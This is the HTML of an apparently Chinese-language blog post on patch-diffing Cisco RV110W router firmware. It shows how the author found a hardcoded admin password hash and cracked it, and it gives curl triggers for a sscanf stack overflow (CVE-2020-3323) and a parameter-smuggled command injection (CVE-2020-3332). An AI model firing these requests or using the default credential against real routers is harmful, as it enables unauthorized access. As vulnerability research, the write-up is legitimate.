@@ -1,0 +1,584 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.8.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"21guns.top","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="[toc] 补丁对比法对Cisco RV110W进行固件分析上01-diff目录12345678910111213# 记录目录及文件信息cd _RV110W_FW_1.2.2.8.bin.extracted/squashfs-rootfind . -type f -print | sort -u | xargs md5sum &amp;gt; /tmp/1.2.2.8.md5cd _RV110W_FW_1">
+<meta name="keywords" content="漏洞分析,IOT安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="通过补丁对比发现Cisco RV110W的多个漏洞">
+<meta property="og:url" content="http://21guns.top/2021/04/18/iot/通过补丁对比发现Cisco RV110W的多个漏洞/index.html">
+<meta property="og:site_name" content="have a nice day">
+<meta property="og:description" content="[toc] 补丁对比法对Cisco RV110W进行固件分析上01-diff目录12345678910111213# 记录目录及文件信息cd _RV110W_FW_1.2.2.8.bin.extracted/squashfs-rootfind . -type f -print | sort -u | xargs md5sum &amp;gt; /tmp/1.2.2.8.md5cd _RV110W_FW_1">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2022-03-04T06:47:32.272Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="通过补丁对比发现Cisco RV110W的多个漏洞">
+<meta name="twitter:description" content="[toc] 补丁对比法对Cisco RV110W进行固件分析上01-diff目录12345678910111213# 记录目录及文件信息cd _RV110W_FW_1.2.2.8.bin.extracted/squashfs-rootfind . -type f -print | sort -u | xargs md5sum &amp;gt; /tmp/1.2.2.8.md5cd _RV110W_FW_1">
+
+<link rel="canonical" href="http://21guns.top/2021/04/18/iot/通过补丁对比发现Cisco RV110W的多个漏洞/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>通过补丁对比发现Cisco RV110W的多个漏洞 | have a nice day</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">have a nice day</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" placeholder="搜索..." spellcheck="false" type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://21guns.top/2021/04/18/iot/通过补丁对比发现Cisco RV110W的多个漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="21Guns">
+      <meta itemprop="description" content>
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="have a nice day">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          通过补丁对比发现Cisco RV110W的多个漏洞
+        </h1>
+
+        <div class="post-meta">
+
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-04-18 14:41:33" itemprop="dateCreated datePublished" datetime="2021-04-18T14:41:33+08:00">2021-04-18</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-03-04 14:47:32" itemprop="dateModified" datetime="2022-03-04T14:47:32+08:00">2022-03-04</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/IOT安全/" itemprop="url" rel="index"><span itemprop="name">IOT安全</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>[toc]</p>
+<h1 id="补丁对比法对Cisco-RV110W进行固件分析"><a href="#补丁对比法对Cisco-RV110W进行固件分析" class="headerlink" title="补丁对比法对Cisco RV110W进行固件分析"></a>补丁对比法对Cisco RV110W进行固件分析</h1><h2 id="上"><a href="#上" class="headerlink" title="上"></a>上</h2><h3 id="01-diff目录"><a href="#01-diff目录" class="headerlink" title="01-diff目录"></a>01-diff目录</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 记录目录及文件信息</span></span><br><span class="line"><span class="built_in">cd</span> _RV110W_FW_1.2.2.8.bin.extracted/squashfs-root</span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">print</span> | sort -u | xargs md5sum &gt; /tmp/1.2.2.8.md5</span><br><span class="line"><span class="built_in">cd</span> _RV110W_FW_1.2.2.5.bin.extracted/squashfs-root</span><br><span class="line">find . -<span class="built_in">type</span> f -<span class="built_in">print</span> | sort -u | xargs md5sum &gt; /tmp/1.2.2.5.md5</span><br><span class="line"></span><br><span class="line"><span class="comment"># 命令解读：find . -type f -print | sort -u | xargs md5sum **&gt;** /tmp/1.2.2.8.md5</span></span><br><span class="line">- -<span class="built_in">print</span>：假设find指令的回传值为Ture，就将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有“./”字符串；</span><br><span class="line">- sort排序，-u 意味着是唯一的(unique)，输出的结果是去完重了的。</span><br><span class="line">- `xargs`命令的作用，是将标准输入转为命令行参数，如$ <span class="built_in">echo</span> <span class="string">"hello world"</span> | xargs <span class="built_in">echo</span>（本可以用｜管道符，但大多数命令都不接受标准输入作为参数，如<span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># diff以逐行的方式，比较文本文件的异同处</span></span><br><span class="line">diff /tmp/1.2.2.8.md5 /tmp/1.2.2.5.md5</span><br></pre></td></tr></table></figure>
+<ul>
+<li>读懂diff结果：<a href="http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html，举例：4c、\" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/2012/08/how_to_read_diff.html，举例：4c、\</a>&lt; a、-–、> b<ul>
+<li>4c4：它分成三个部分：前面的”4”，表示f1的第4行有变化；中间的”c”表示变动的模式是内容改变（change），其他模式还有”增加”（a，代表addition）和”删除”（d，代表deletion）；后面的”4”，表示变动后变成f2的第4行。</li>
+<li>&lt; a：前面的小于号，表示要从f1当中去除该行（也就是第4行），后面的”a”表示该行的内容。</li>
+<li>> b：前面的大于号表示f2增加了该行，后面的”b”表示该行的内容。</li>
+<li>也就表示，第4行有修改，旧文件第四行删掉a，又在第四行增加b</li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>316d316、&lt; d9a523641b71ff29baf20be8fcaced0c  ./usr/sbin/utelnetd</p>
+<ul>
+<li>删除了316行，删除了<em>utelnetd</em>二进制文件</li>
+<li>It makes sense given that this service can’t be enabled from the web UI. Probably an artifact left from internal testing.</li>
+<li>新版本删掉它是合理的，因为无法从web界面启动它，可能当时为了测试留下的</li>
+</ul>
+</li>
+</ul>
+<h3 id="02-utelnetd"><a href="#02-utelnetd" class="headerlink" title="02-utelnetd"></a>02-utelnetd</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Anyway, *utelnetd* - like any good unix tool - rely on */bin/login* to authenticate users. It’s a built-in binary that uses */etc/shadow* to authenticate users. The shadow file is absent from the firmware squashfs file system so it must be generated when the device boots up.</span><br></pre></td></tr></table></figure>
+<ul>
+<li><em>utelnetd</em>像其他Unix工具一样，都依靠<em>/ bin / login</em>来进行用户认证</li>
+<li><em>/ bin / login</em>是一个内置的二进制文件，使用<em>/ etc / shadow</em>对用户进行身份验证。</li>
+<li>固件squashfs文件系统中没有shadow文件，因此必须在设备启动时生成该shadow文件。</li>
+</ul>
+<h3 id="03-获取hash"><a href="#03-获取hash" class="headerlink" title="03-获取hash"></a>03-获取hash</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 哪里引用shadow</span></span><br><span class="line"><span class="comment"># （-r递归、当前目录下所有文件、搜内容</span></span><br><span class="line"><span class="comment"># （/sbin/rc在Linux初始化过程中执行</span></span><br><span class="line">grep <span class="string">'etc/shadow'</span> . -r</span><br><span class="line">Binary file ./squashfs-root/bin/busybox matches</span><br><span class="line">Binary file ./squashfs-root/sbin/rc matches</span><br><span class="line">Binary file ./squashfs-root/lib/libc.so.0 matches</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定文件中搜字符串</span></span><br><span class="line"><span class="comment"># （静态默认凭据属于admin用户</span></span><br><span class="line"><span class="comment"># （只有该密码的md5crypt 哈希值</span></span><br><span class="line">strings ./squashfs-root/sbin/rc | grep shadow</span><br><span class="line"><span class="built_in">echo</span> <span class="string">'admin:$1$aUzX1IiE$x2rSbqyggRaYAJgSRJ9uC.:15880:0:99999:7:::'</span> &gt; /etc/shadow</span><br><span class="line"></span><br><span class="line"><span class="comment"># hash解密</span></span><br><span class="line"><span class="comment"># （直接在线解密：https://www.somd5.com，也能得到</span></span><br><span class="line"><span class="comment"># （未探究hashcat用法</span></span><br><span class="line">hashcat -O -w 4 --status -m 500 /tmp/rv110.txt /tmp/rockyou.txt -r /tmp/InsidePro-PasswordsPro.rule  --show</span><br><span class="line"><span class="variable">$1</span><span class="variable">$aUzX1IiE</span><span class="variable">$x2rSbqyggRaYAJgSRJ9uC</span>.:Admin123</span><br></pre></td></tr></table></figure>
+<h3 id="04-总结"><a href="#04-总结" class="headerlink" title="04-总结"></a>04-总结</h3><ul>
+<li><p>综上，信息泄漏：默认账号密码：admin:Admin123（25版本有，28版本没有</p>
+</li>
+<li><p>流程</p>
+<ul>
+<li>通过文件hash对比，发现删掉了<em>utelnetd</em></li>
+<li><em>utelnetd</em>通过<em>/ bin / login</em>来进行用户认证（他又通过<em>/etc/shadow</em> </li>
+<li>shadow默认没有，必须在设备启动时生成该shadow文件。</li>
+<li>搜索字符串找到/sbin/rc文件，其在Linux初始化中执行</li>
+<li>/sbin/rc中找到admin及其hash值，解密</li>
+</ul>
+</li>
+</ul>
+<h2 id="下"><a href="#下" class="headerlink" title="下"></a>下</h2><h3 id="version-track"><a href="#version-track" class="headerlink" title="version_track"></a>version_track</h3><h4 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h4><ul>
+<li><p>ghidra导入库</p>
+<ul>
+<li>提供库搜索路径，以便Ghidra也可以加载与二进制文件动态链接的系统库。</li>
+<li>options、load external libraries、eidt path、+</li>
+<li>添加：<em>/lib</em> 和 <em>/usr/lib</em></li>
+</ul>
+</li>
+<li><p>要先分析</p>
+<ul>
+<li>将每个文件加载到项目中后，双击它们并执行自动分析。</li>
+<li><p>分析完成后，保存文件并返回主窗口。（file-save或command + s</p>
+</li>
+<li><p>既然我们的二进制文件已经由Ghidra进行了分析，我们就可以启动版本跟踪会话。</p>
+</li>
+<li>根据您的喜好命名会话，并将两种版本的<em>httpd</em>都设置为源程序和目标程序：</li>
+<li>分析后才能进行版本追踪 </li>
+</ul>
+</li>
+</ul>
+<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
+<li>大致流程<ul>
+<li>脚印图标、file、new session、命名、指定源/目标、开始图标来test、next/finish</li>
+<li>finish后，共3个窗口：version track主窗口、源/目的工具</li>
+<li>主窗口-魔术棒图标来自动分析</li>
+<li>过滤</li>
+</ul>
+</li>
+<li>设置过滤：过滤器图标（match table 而非markup item table）<ul>
+<li>match type：去掉data</li>
+<li>symbol type：全选</li>
+<li>Association Status：只选available</li>
+<li>Algorithm：只Implied Match</li>
+<li>address range：默认即可</li>
+<li>（其他选项待查看帮助</li>
+</ul>
+</li>
+</ul>
+<h4 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h4><ul>
+<li>decompile view：<ul>
+<li>总是超时失败：Exception while decompiling 0040c400: process: timeout（推测超时原因：函数本身比较大、指定了lib库牵涉的文件多</li>
+<li>设置timeout时间：<a href="https://reverseengineering.stackexchange.com/questions/20828/how-to-increase-decompilation-timeout-in-ghidra（在打开二进制文件的窗口中才有这选项，edit-tool" target="_blank" rel="noopener">https://reverseengineering.stackexchange.com/questions/20828/how-to-increase-decompilation-timeout-in-ghidra（在打开二进制文件的窗口中才有这选项，edit-tool</a> option-decompiler，而且不同文件间是独立的</li>
+<li>不用version track的反编译了，直接ghidra反编译，然后修改超时时间为300，结合在线文本差异对比（version track会有三个窗口，修改源/目的文件的反编译超时时间，发现在主窗口没生效，故不用</li>
+<li>（第二个函数可以反编译成功，观察，此窗口好像也没有差异对比功能</li>
+</ul>
+</li>
+<li>过滤后结果</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 共2:FUN_0040c400-FUN_0040c460、FUN_0041d0b0-FUN_0041cde0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># FUN_0040c400-FUN_0040c460</span></span><br><span class="line">strcpy变为strncpy，限制了长度，防止栈溢出</span><br><span class="line"></span><br><span class="line"><span class="comment"># FUN_0041d0b0-FUN_0041cde0</span></span><br><span class="line"><span class="comment"># 多加了一个对“.cfgi”的strstr过滤，防止信息泄漏（CVE-2020-3150信息泄漏是通过访问/startup.cfg实现的、asp-cgi-txt都是防止直接返回内容的后缀</span></span><br><span class="line">__s1_00 = strstr(pcParm1,<span class="string">".asp"</span>);</span><br><span class="line"><span class="keyword">if</span> (((((__s1_00 != (char *)0x0) || (__s1_00 = strstr(pcParm1,<span class="string">".cgi"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">       (__s1_00 = strstr(pcParm1,<span class="string">".txt"</span>), __s1_00 != (char *)0x0)) &amp;&amp;</span><br><span class="line">       </span><br><span class="line">__s1_00 = strstr(pcParm1,<span class="string">".asp"</span>);</span><br><span class="line">  <span class="keyword">if</span> (((((__s1_00 != (char *)0x0) || (__s1_00 = strstr(pcParm1,<span class="string">".cgi"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">       (__s1_00 = strstr(pcParm1,<span class="string">".txt"</span>), __s1_00 != (char *)0x0)) ||</span><br><span class="line">      (__s1_00 = strstr(pcParm1,<span class="string">".cfg"</span>), __s1_00 != (char *)0x0)) &amp;&amp;</span><br></pre></td></tr></table></figure>
+<h3 id="bindiff"><a href="#bindiff" class="headerlink" title="bindiff"></a>bindiff</h3><h4 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h4><ul>
+<li>bindiff分析：ghidra需要安装binexport，导出后再bindiff</li>
+<li>安装binexport</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 参考：</span></span><br><span class="line">https://ihack4falafel.github.io/Patch-Diffing-with-Ghidra/、https://github.com/google/binexport/tree/master/java/BinExport</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载源码：</span></span><br><span class="line">https://github.com/google/binexport/tree/master/java/BinExport</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ubuntu下：（最终失败，转mac</span></span><br><span class="line">安装gradle构建工具：sudo apt  install gradle</span><br><span class="line"><span class="built_in">cd</span>到binexport/java/BinExport执行构建命令：gradle</span><br><span class="line">（失败，报错 Gradle version is 4.4.1. Minimum supported version is 5.6，用apt安装的是低版本，用snap安装的是6.6.1的，改用后者</span><br><span class="line">安装gradle构建工具：sudo snap  install gradle --classic（不加参数提示有风险，故加参数来确认安装</span><br><span class="line">要有ghidra的路径，gradle -PGHIDRA_INSTALL_DIR=~/Desktop/ghidra报错，Ubuntu下根本没有，所以转mac来build</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mac下</span></span><br><span class="line">安装gradle构建工具：brew install gradle</span><br><span class="line"><span class="built_in">cd</span>到/binexport/java/BinExport</span><br><span class="line">执行：gradle -PGHIDRA_INSTALL_DIR=/Applications/ghidra_9.0（mac下ghidra的真实路径</span><br><span class="line">报错：类文件具有错误的版本 55.0, 应为 52.0</span><br><span class="line">（更新ghidra为9.1.2也这样，暂搁置</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接下载编译好的：</span></span><br><span class="line">https://github.com/google/binexport/releases，搜索ghidra得到https://github.com/google/binexport/releases/download/v11/ghidra_BinExport.zip</span><br></pre></td></tr></table></figure>
+<h4 id="结果-1"><a href="#结果-1" class="headerlink" title="结果"></a>结果</h4><ul>
+<li>Finding CVE-2020-3323：栈溢出，unauthenticated, remote attacker to execute arbitrary code</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 排除前面的strcpy，因为漏洞描述是unauthenticated，但strcpy调用无法通过未经身份验证的上下文访问</span></span><br><span class="line"><span class="comment"># an insecure call to sscanf in the guest_logout_cgi function.为代码如下：</span></span><br><span class="line">char acStack172 [64];</span><br><span class="line">char acStack108 [68];</span><br><span class="line"></span><br><span class="line">char* cip = get_cgi(<span class="string">"cip"</span>);</span><br><span class="line">char* cmac = get_cgi(<span class="string">"cmac"</span>);</span><br><span class="line">char* submit_button = get_cgi(<span class="string">"submit_button"</span>);<span class="comment"># 获取post数据</span></span><br><span class="line"></span><br><span class="line">int v = strstr(submit_button,<span class="string">"status_guestnet.asp"</span>);</span><br><span class="line"><span class="keyword">if</span>(v != NULL)&#123;</span><br><span class="line">    // they<span class="string">'re looking for status_guestnet.asp;session_id=current_user_session_id_value</span></span><br><span class="line"><span class="string">    sscanf(submit_button,"%[^;];%*[^=]=%[^\n]",acStack108,acStack172);# 漏洞点</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 触发</span></span><br><span class="line"><span class="string">curl -ki -X POST https://192.168.1.43/guest_logout.cgi -d"cmac=00:01:02:03:04:05"-d "ip=192.168.1.1"-d "submit_button=status_guestnet.aspAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB"</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>Finding CVE-2020-3332：命令注入，authenticated, remote attacker to inject arbitrary shell commands</li>
+</ul>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># get_cgi读取post数据</span></span><br><span class="line">`pcVar2 = (char *)get_cgi(<span class="string">"sys_iperfWinSize"</span>);`</span><br><span class="line">`pcVar3 = (char *)get_cgi(<span class="string">"sys_iperfPort"</span>);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># snprintf拼接字符串</span></span><br><span class="line">`snprintf(acStack112,0x50,<span class="string">"iperf %s -s -p %s -w %s -D &gt; /tmp/result.txt &amp;"</span>,__s1,pcVar3,pcVar2);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># system执行</span></span><br><span class="line">`system(acStack112);`</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发</span></span><br><span class="line">curl -ki -X POST <span class="string">'https://192.168.1.43/mfgtst.cgi?sys_iperfServer=1&amp;sys_iperfWinSize=1</span></span><br><span class="line"><span class="string">&amp;sys_iperfPort=80%7C%7Cping%20-c%203%2010.10.10.100%7C%7C&amp;sys_iperfMode=-u</span></span><br><span class="line"><span class="string">;session_id=0d00538ca990439d194ff8b294927e08'</span></span><br><span class="line">HTTP/1.1 200 Ok</span><br><span class="line">Server: httpd</span><br><span class="line">Date: Mon, 05 Oct 2020 10:31:09 GMT</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Expires: 0</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 Ok</span><br><span class="line">Server: httpd</span><br><span class="line">Date: Mon, 05 Oct 2020 10:31:16 GMT</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="comment"># 前提：通过认证后、手动将nvram设置的mfg_radio设为on</span></span><br></pre></td></tr></table></figure>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><ul>
+<li>version track使用：<a href="https://blog.threatrack.de/2019/10/02/ghidra-patch-diff/" target="_blank" rel="noopener">https://blog.threatrack.de/2019/10/02/ghidra-patch-diff/</a></li>
+<li>通过过滤器，找到函数后，就不用version track了（就是过滤器有用</li>
+<li>gd中添加书签：ctrl+D</li>
+<li>信息泄漏CVE-2020-3150：<a href="https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/07/14/breaking-cisco-rv-again/</a></li>
+<li>Ghidra version tracking还是不够强大，bindiff更专业</li>
+<li>有的更新并没有与cve相对应，而是程序员的主动修改，前者是因为产生漏洞而被动修改</li>
+<li>有何区别：ghidra分析后再bindiff、ida分析后再bindiff、直接bindiff（分析后的肯定要好、设置lib库再分析后的肯定更好</li>
+</ul>
+<blockquote>
+<p>参考：</p>
+<ul>
+<li><a href="https://quentinkaiser.be//exploitdev/2020/09/23/ghetto-patch-diffing-cisco/" target="_blank" rel="noopener">https://quentinkaiser.be//exploitdev/2020/09/23/ghetto-patch-diffing-cisco/</a></li>
+<li><a href="https://quentinkaiser.be/exploitdev/2020/10/01/patch-diffing-cisco-rv110/" target="_blank" rel="noopener">https://quentinkaiser.be/exploitdev/2020/10/01/patch-diffing-cisco-rv110/</a></li>
+</ul>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>21Guns
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://21guns.top/2021/04/18/iot/通过补丁对比发现Cisco RV110W的多个漏洞/" title="通过补丁对比发现Cisco RV110W的多个漏洞">http://21guns.top/2021/04/18/iot/通过补丁对比发现Cisco RV110W的多个漏洞/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/漏洞分析/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/IOT安全/" rel="tag"># IOT安全</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/04/10/iot/耶鲁智能门锁的安全分析/" rel="prev" title="耶鲁智能门锁的安全分析">
